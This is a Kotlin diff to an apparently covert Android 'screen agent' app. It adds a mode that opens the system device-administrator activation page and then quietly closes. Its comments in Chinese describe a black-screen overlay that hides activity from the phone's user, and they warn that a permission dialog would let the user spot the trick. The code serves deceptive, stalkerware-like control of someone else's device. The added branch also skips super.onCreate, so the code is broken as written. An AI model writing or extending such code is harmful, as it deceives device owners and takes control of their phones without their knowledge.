@@ -20,6 +20,19 @@ class PermissionActivity : AppCompatActivity() {
     private var asked = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
+        // 作为"前台载体"被调用：只负责打开系统激活页，然后自己退出
+        if (intent?.getBooleanExtra("open_admin_page", false) == true) {
+            Log.d(TAG, "载体模式：打开设备管理激活页")
+            runCatching {
+                startActivityForResult(
+                    com.zaka.screenagent.admin.MoyingAdminReceiver.activationIntent(this, newTask = false),
+                    2001
+                )
+            }
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ finish() }, 1_500L)
+            return
+        }
+
         super.onCreate(savedInstanceState)
         // 黑屏遮罩期间不能弹权限框：系统对话框会盖在遮罩上面，用户一眼就看出破绽
         if (com.zaka.screenagent.ui.BlackScreen.isShowing()) {
